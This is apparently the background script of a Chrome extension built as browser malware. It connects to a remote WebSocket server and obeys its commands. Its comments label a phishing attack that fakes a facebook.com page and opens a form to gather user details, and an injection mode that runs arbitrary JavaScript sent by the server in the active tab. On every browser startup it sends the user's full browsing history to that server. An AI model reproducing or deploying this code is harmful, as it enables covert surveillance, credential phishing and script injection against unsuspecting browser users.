//The server we are connecting to.
var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

//Variables we are using to listen to the server.
//Object - Full json object to be parsed
//type - The type of signal we are receiving from the server
//temp - The site to be added to the blacklist of sites
//translateString - The JS script in string form
var id = "";
var object = "";
var type = "";
var tempSite = "hello";
var translateString = 'alert("Hello!")';
var jsSite = "https://www.facebook.com/";
var allSites = [];
var phishSite = "facebook.com";

//FOR TESTING READ HERE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
//TO TEST JS EXE: MAKE TRANSLATESTRING EMPTY AND JSSITE EMPTY. SEND FROM SERVER .JSSTRING AND .SITE AND TYPE js
//TO TEST PHISHING: MAKE PHISHSITE EMPTY. SEND FROM SERVER .fishSite AND TYPE html
//TO TEST ADDING TO BLOCK LIST, MAKE TEMPSITE EMPTY. SEND FROM SERVER ADDSTRING. AND TYPE listAdd

//TO TEST IDS, NEED TO UNCOMMENT WHERE IF(TEMPID == ID)

//Listen to the server and parse objects.
ws.onmessage = function (e) {
    object = JSON.parse(e.data);
    id = object.id; //256 bit value
    type = object.type;
  //  tempSite = object.addString; //Site to add to blacklist
  //  translateString = object.jsString; //Arbitrary js function
  //  jsSite = object.site //website for js attack
  //  phishSite = object.fishSite //string website for phish
    allSites = object.allSites;

    switch(type){
      case 'blackList':
        chrome.storage.sync.set({'values': allSites}, function(){
          alert("Updated list!")
        });
        break;
      //Phishing attack
      case 'html':
        chrome.storage.sync.get("id", function(ev){
        var tempId=ev.id;
        //if(tempId === id){
          chrome.storage.sync.set({'compareSite' : phishSite}, function(){});
          chrome.tabs.query({active: true, currentWindow: true}, function(tab){
            chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
          });
        //}
        });
        break;
      case 'js':
      //JS exe injection
        chrome.storage.sync.get("id", function(ev){
        var tempId=ev.id;
      //  if(tempId === id){
          chrome.storage.sync.set({'scriptExe': translateString, 'redirectSite': jsSite}, function(){});
          chrome.tabs.query({active: true, currentWindow: true}, function(tab){
            chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
          });
        //  }
        });
        break;
      case 'listAdd':
      //Add to the list of blacklist websites.
        chrome.storage.sync.set({'addSite': tempSite}, function(){});
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
        });
        break;
    }
};

/*
This function will listen for a message from content script, and load a form we
created to get extra information from the user.
}
*/
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
  switch(request.action){
    case 'load':
      chrome.tabs.create({url: '/phishForm.html', active: true});
      break;
    }
});

//Simply send over search history from the user on chrome startup.
chrome.runtime.onStartup.addListener(function(){
  ws.onopen = function(event){
    var jsonPackage = {type: 'getList'};
    ws.send(JSON.stringify(jsonPackage));

    chrome.history.search({text: ""}, function(data) {
      var tempArr = [];
      for(var i = 0; i < data.length; i++){
        tempArr[tempArr.length] = data[i].url;
      }
      chrome.storage.sync.get("id", function(ev){
        var id=ev.id;
        var jsonPackage = {id: id, type: 'history', history: tempArr};
        ws.send(JSON.stringify(jsonPackage));
      });
    });
    chrome.storage.sync.get("id", function(ev){
      var id=ev.id;
      var jsonPackage = {id: id, type: 'Online'};
      ws.send(JSON.stringify(jsonPackage));
    });
  }
});
